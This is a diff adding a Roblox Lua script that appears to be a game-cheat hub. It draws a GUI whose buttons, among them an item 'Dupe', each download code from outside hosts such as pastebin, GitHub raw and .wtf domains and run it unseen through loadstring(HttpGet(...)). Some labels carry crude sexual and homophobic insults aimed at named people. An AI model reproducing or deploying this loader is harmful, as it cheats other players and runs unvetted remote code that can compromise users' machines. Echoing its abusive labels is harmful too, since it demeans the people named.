@@ -1,0 +1,212 @@
+local Main = Instance.new("ScreenGui")
+local MainFraim = Instance.new("Frame")
+local Dupe = Instance.new("TextButton")
+local Name = Instance.new("TextLabel")
+local Bark = Instance.new("TextButton")
+local Blood = Instance.new("TextButton")
+local PinkX = Instance.new("TextButton")
+local Cryptic = Instance.new("TextButton")
+local Ancestor = Instance.new("TextButton")
+local TText = Instance.new("TextLabel")
+local Credit = Instance.new("TextLabel")
+local Credittext = Instance.new("TextLabel")
+local OpenFrame = Instance.new("Frame")
+local Openbutton = Instance.new("TextButton")
+local CloseFrame = Instance.new("Frame")
+local CloseButton = Instance.new("TextButton")
+ 
+Main.Name = "Main"
+Main.Parent = game.CoreGui
+
+MainFraim.Name = "Main Fraim"
+MainFraim.Parent = Main
+MainFraim.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+MainFraim.BorderColor3 = Color3.new(1, 1, 1)
+MainFraim.BorderSizePixel = 2
+MainFraim.Position = UDim2.new(0.327238321, 0, 0.147659019, 0)
+MainFraim.Size = UDim2.new(0, 415, 0, 510)
+MainFraim.Active = true
+MainFraim.Draggable = true
+
+Dupe.Name = "Dupe"
+Dupe.Parent = MainFraim
+Dupe.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Dupe.BorderColor3 = Color3.new(1, 1, 1)
+Dupe.Position = UDim2.new(0.0144578312, 0, 0.139215693, 0)
+Dupe.Size = UDim2.new(0, 185, 0, 50)
+Dupe.Font = Enum.Font.Roboto
+Dupe.Text = "Dupe"
+Dupe.TextColor3 = Color3.new(0, 0, 0)
+Dupe.TextSize = 24
+Dupe.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/TXBgDXMy", true))()
+end)
+
+
+Name.Name = "Name"
+Name.Parent = MainFraim
+Name.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Name.BorderColor3 = Color3.new(1, 1, 1)
+Name.Position = UDim2.new(0.0144578312, 0, 0.0117647061, 0)
+Name.Size = UDim2.new(0, 403, 0, 50)
+Name.Font = Enum.Font.Roboto
+Name.Text = "IHackForThisHalo Is Gay"
+Name.TextColor3 = Color3.new(0, 0, 0)
+Name.TextSize = 24
+
+Bark.Name = "Bark"
+Bark.Parent = MainFraim
+Bark.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Bark.BorderColor3 = Color3.new(1, 1, 1)
+Bark.Position = UDim2.new(0.522891581, 0, 0.139215693, 0)
+Bark.Size = UDim2.new(0, 185, 0, 50)
+Bark.Font = Enum.Font.Roboto
+Bark.Text = "Bark"
+Bark.TextColor3 = Color3.new(0, 0, 0)
+Bark.TextSize = 24
+Bark.MouseButton1Down:connect(function()
+	loadstring(game:HttpGetAsync'https://cdn.applebee1558.com/bark/bark.lua')('8.4 beta released :))')
+end)
+
+Blood.Name = "Blood"
+Blood.Parent = MainFraim
+Blood.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Blood.BorderColor3 = Color3.new(1, 1, 1)
+Blood.Position = UDim2.new(0.0192771088, 0, 0.278431386, 0)
+Blood.Size = UDim2.new(0, 185, 0, 50)
+Blood.Font = Enum.Font.Roboto
+Blood.Text = "Blood"
+Blood.TextColor3 = Color3.new(0, 0, 0)
+Blood.TextSize = 24
+Blood.MouseButton1Down:connect(function()
+	_G.BloodKey = "AV1190ODDY10072021HackerAV1190"
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/teablood/hiding/main/nil"))()
+end)
+
+PinkX.Name = "PinkX"
+PinkX.Parent = MainFraim
+PinkX.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+PinkX.BorderColor3 = Color3.new(1, 1, 1)
+PinkX.Position = UDim2.new(0.522891581, 0, 0.278431386, 0)
+PinkX.Size = UDim2.new(0, 185, 0, 50)
+PinkX.Font = Enum.Font.Roboto
+PinkX.Text = "PinkX"
+PinkX.TextColor3 = Color3.new(0, 0, 0)
+PinkX.TextSize = 24
+PinkX.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://drizzy.wtf//PinkX/Script"))()
+end)
+
+Cryptic.Name = "Cryptic"
+Cryptic.Parent = MainFraim
+Cryptic.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Cryptic.BorderColor3 = Color3.new(1, 1, 1)
+Cryptic.Position = UDim2.new(0.0192771088, 0, 0.409803927, 0)
+Cryptic.Size = UDim2.new(0, 185, 0, 50)
+Cryptic.Font = Enum.Font.Roboto
+Cryptic.Text = "Cryptic"
+Cryptic.TextColor3 = Color3.new(0, 0, 0)
+Cryptic.TextSize = 24
+Cryptic.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/CrypticModder/Cryptic-Lumber/main/cryptic.wtf"))()
+end)
+
+Ancestor.Name = "Ancestor"
+Ancestor.Parent = MainFraim
+Ancestor.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
+Ancestor.BorderColor3 = Color3.new(1, 1, 1)
+Ancestor.Position = UDim2.new(0.522891581, 0, 0.409803927, 0)
+Ancestor.Size = UDim2.new(0, 185, 0, 50)
+Ancestor.Font = Enum.Font.Roboto
+Ancestor.Text = "Ancestor"
+Ancestor.TextColor3 = Color3.new(0, 0, 0)
+Ancestor.TextSize = 24
+Ancestor.MouseButton1Down:connect(function()
+	loadstring(game:HttpGetAsync'https://ancestordevelopment.wtf/Ancestor')('Ancestor V3 Winning :D');
+end)
+
+TText.Name = "TText"
+TText.Parent = MainFraim
+TText.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+TText.BorderColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+TText.Position = UDim2.new(0.0192771088, 0, 0.556862772, 0)
+TText.Size = UDim2.new(0, 394, 0, 104)
+TText.Font = Enum.Font.Roboto
+TText.Text = "I suck Kaleb off"
+TText.TextColor3 = Color3.new(0, 0, 0)
+TText.TextSize = 24
+
+Credit.Name = "Credit"
+Credit.Parent = MainFraim
+Credit.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+Credit.BorderColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+Credit.Position = UDim2.new(0.0192771088, 0, 0.745098114, 0)
+Credit.Size = UDim2.new(0, 394, 0, 57)
+Credit.Font = Enum.Font.Roboto
+Credit.Text = "Credits"
+Credit.TextColor3 = Color3.new(0, 0, 0)
+Credit.TextSize = 24
+
+Credittext.Name = "Credit text"
+Credittext.Parent = MainFraim
+Credittext.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+Credittext.BorderColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+Credittext.Position = UDim2.new(0.0192771088, 0, 0.856862783, 0)
+Credittext.Size = UDim2.new(0, 401, 0, 49)
+Credittext.Font = Enum.Font.Roboto
+Credittext.Text = "Fusion_cloud513X / 1sissy"
+Credittext.TextColor3 = Color3.new(0, 0, 0)
+Credittext.TextSize = 14
+
+OpenFrame.Name = "Open Frame"
+OpenFrame.Parent = Main
+OpenFrame.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+OpenFrame.BorderColor3 = Color3.new(1, 1, 1)
+OpenFrame.BorderSizePixel = 2
+OpenFrame.Position = UDim2.new(0.447667122, 0, 0.883553445, 0)
+OpenFrame.Size = UDim2.new(0, 100, 0, 39)
+OpenFrame.Visible = false
+OpenFrame.Active = true
+
+Openbutton.Name = "Open button"
+Openbutton.Parent = OpenFrame
+Openbutton.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+Openbutton.BorderColor3 = Color3.new(1, 1, 1)
+Openbutton.BorderSizePixel = 2
+Openbutton.Size = UDim2.new(0, 100, 0, 39)
+Openbutton.Font = Enum.Font.Roboto
+Openbutton.Text = "Open"
+Openbutton.TextColor3 = Color3.new(1, 1, 1)
+Openbutton.TextSize = 24
+Openbutton.MouseButton1Down:connect(function()
+	MainFraim.Visible = true
+	OpenFrame.Visible = false
+	CloseFrame.Visible = true
+	
+end)
+
+CloseFrame.Name = "Close Frame"
+CloseFrame.Parent = Main
+CloseFrame.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+CloseFrame.BorderColor3 = Color3.new(1, 1, 1)
+CloseFrame.BorderSizePixel = 2
+CloseFrame.Position = UDim2.new(0.447667092, 0, 0.883553445, 0)
+CloseFrame.Size = UDim2.new(0, 100, 0, 39)
+CloseFrame.Active = true
+CloseFrame.Visible = true
+
+CloseButton.Name = "Close Button"
+CloseButton.Parent = CloseFrame
+CloseButton.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+CloseButton.BorderColor3 = Color3.new(1, 1, 1)
+CloseButton.BorderSizePixel = 2
+CloseButton.Size = UDim2.new(0, 100, 0, 39)
+CloseButton.Font = Enum.Font.Roboto
+CloseButton.Text = "Close"
+CloseButton.TextColor3 = Color3.new(1, 1, 1)
+CloseButton.TextSize = 24
+CloseButton.MouseButton1Down:connect(function()
+	OpenFrame.Visible = true
+	MainFraim.Visible = false
+	CloseFrame.Visible = false
+end)
